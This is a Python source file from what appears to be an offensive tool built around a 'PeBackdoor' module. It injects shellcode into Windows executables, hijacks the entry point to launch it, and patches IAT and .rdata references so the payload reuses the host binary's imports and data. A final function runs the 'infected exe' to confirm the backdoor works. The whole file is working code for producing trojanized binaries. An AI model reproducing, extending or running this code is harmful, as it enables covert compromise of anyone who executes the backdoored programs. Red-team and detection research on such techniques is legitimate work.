from helper import *
import shutil
import pprint
import logging
import time
import tempfile
import logging

from model.carrier import Carrier, DataReuseEntry
from peparser.pehelper import *
from model.exehost import *
from observer import observer
from helper import rbrunmode_str
from derbackdoorer.derbackdoorer import PeBackdoor
from derbackdoorer.mype import MyPe
from model.project import Project
from model.settings import Settings

logger = logging.getLogger("Injector")


def inject_exe(
#    shellcode_in: FilePath,
#    exe_in: FilePath,
#    exe_out: FilePath,
#    inject_mode: int,
#    source_style: SourceStyle
        
    main_shc: FilePath,
    settings: Settings,
    project: Project,
):
    shellcode_in = project.payload.payload_path
    exe_in = settings.inject_exe_in
    exe_out = settings.inject_exe_out
    inject_mode = settings.inject_mode
    source_style = settings.source_style

    logger.info("--[ Injecting: {} into: {} -> {} (mode: {})".format(
        shellcode_in, exe_in, exe_out, inject_mode
    ))
    #logger.warn("---[ Inject mode: {}".format(rbrunmode_str(inject_mode)))
    # create copy of file exe_in to exe_out
    #shutil.copyfile(exe_in, exe_out)

    # MyPe is a representation of the exe file
    # We gonna modify it, and store it at the end
    mype = MyPe()
    mype.openFile(exe_in)
    peinj = PeBackdoor(mype)

    peinj.runMode = settings.inject_mode
    peinj.shellcodeData = main_shc # project.payload.payload_data

    if not peinj.injectShellcode():
        logger.error('Could not inject shellcode into PE file!')
        return False

    if not peinj.setupShellcodeEntryPoint():
        logger.error('Could not setup shellcode launch within PE file!')
        return False
    
    if source_style == SourceStyle.iat_reuse:
        injected_fix_iat(mype, project.carrier, project.exe_host)
    
    if True:
        injected_fix_data(mype, project.carrier, project.exe_host)

    mype.write(exe_out)

    #result = peinj.backdoor(
    #    1, # always overwrite .text section
    #    inject_mode, 
    #    shellcode_in, 
    #    exe_in, 
    #    exe_out
    #)
    #if not result:
    #    logging.error("Error: Redbackdoorer failed")
    #    raise Exception("Redbackdoorer failed")

    # verify and log
    shellcode = file_readall_binary(shellcode_in)
    shellcode_len = len(shellcode)
    code = extract_code_from_exe_file(exe_out)
    in_code = code[peinj.shellcodeOffsetRel:peinj.shellcodeOffsetRel+shellcode_len]
    jmp_code = code[peinj.backdoorOffsetRel:peinj.backdoorOffsetRel+12]
    if config.debug:
        observer.add_code("exe_extracted_loader", in_code)
        observer.add_code("exe_extracted_jmp", jmp_code)
    #if in_code != shellcode:
    #    raise Exception("Shellcode injection error")


def injected_fix_iat(mype: MyPe, carrier: Carrier, exe_host: ExeHost):
    """replace IAT-placeholders in shellcode with call's to the IAT"""
    #code = extract_code_from_exe_file(exe_out)
    code = mype.get_code_section_data()  # BUG WITHOUT PLACEHOLDR
    observer.add_code("exe_extracted_iat", code)

    for iatRequest in carrier.get_all_iat_requests():
        if not iatRequest.placeholder in code:
            raise Exception("IatResolve ID {} not found, abort".format(iatRequest.placeholder))
        destination_virtual_address = exe_host.get_vaddr_of_iatentry(iatRequest.name)
        if destination_virtual_address == None:
            raise Exception("IatResolve: Function {} not found".format(iatRequest.name))
        
        offset_from_code = code.index(iatRequest.placeholder)
        instruction_virtual_address = offset_from_code + exe_host.image_base + exe_host.code_virtaddr
        logger.info("    Replace {} at VA 0x{:x} with call to IAT at VA 0x{:x}".format(
            iatRequest.placeholder, instruction_virtual_address, destination_virtual_address
        ))
        jmp = assemble_and_disassemble_jump(
            instruction_virtual_address, destination_virtual_address
        )
        code = code.replace(iatRequest.placeholder, jmp)

    # write back our patched code into the exe
    #write_code_section(exe_file=exe_out, new_data=code)
    mype.write_code_section_data(code)


def injected_fix_data(mype: MyPe, carrier: Carrier, exe_host: ExeHost):
    """Inject shellcode-data into .rdata and replace reusedata_fixup placeholders in code with LEA"""
    # Insert my data into the .rdata section.
    # Chose and save each datareuse_fixup's addres.
    reusedata_fixups: List[DataReuseEntry] = carrier.get_all_reusedata_fixups()
    sect = exe_host.superpe.get_section_by_name(".rdata")
    addr = sect.raw_addr + 0x1AB0 # NEEDED, > 1A00!

    #with open(exe_path, "r+b") as f:
    for datareuse_fixup in reusedata_fixups:
        var_data = datareuse_fixup.data
        #print("    Addr: {} / 0x{:X}  Data: {}".format(
        #    addr, addr, len(var_data)))
        mype.pe.set_bytes_at_offset(addr, var_data)
        #f.seek(addr)
        #f.write(var_data)
        datareuse_fixup.addr = addr + sect.virt_addr + exe_host.image_base - sect.raw_addr
        addr += len(var_data) + 8

    # patch code section
    # replace the placeholder with a LEA instruction to the data we written above
    #code = extract_code_from_exe_file(exe_path)
    code = mype.get_code_section_data()
    print("Type of code: ", type(code)) 
    for datareuse_fixup in reusedata_fixups:
        if not datareuse_fixup.randbytes in code:
            raise Exception("DataResuse: ID {} not found, abort".format(
                datareuse_fixup.randbytes))
        
        offset_from_datasection = code.index(datareuse_fixup.randbytes)
        instruction_virtual_address = offset_from_datasection + exe_host.image_base + exe_host.code_virtaddr
        destination_virtual_address = datareuse_fixup.addr
        logger.info("    Replace {} at VA 0x{:x} with .rdata LEA at VA 0x{:x}".format(
            datareuse_fixup.randbytes, instruction_virtual_address, destination_virtual_address
        ))
        lea = assemble_lea(
            instruction_virtual_address, destination_virtual_address, datareuse_fixup.register
        )
        code = code.replace(datareuse_fixup.randbytes, lea)

    # write back our patched code into the exe
    #write_code_section(exe_file=exe_path, new_data=code)
    mype.write_code_section_data(code)


def verify_injected_exe(exefile: FilePath) -> int:
    logger.info("---[ Verify infected exe: {} ".format(exefile))
    # remove indicator file
    pathlib.Path(VerifyFilename).unlink(missing_ok=True)

    run_process_checkret([
        exefile,
    ], check=False)
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(VerifyFilename):
        logger.info("---> Verify OK. Infected exe works (file was created)")
        # better to remove it immediately
        os.remove(VerifyFilename)
        return 0
    else:
        logger.error("---> Verify FAIL. Infected exe does not work (no file created)")
        return 1

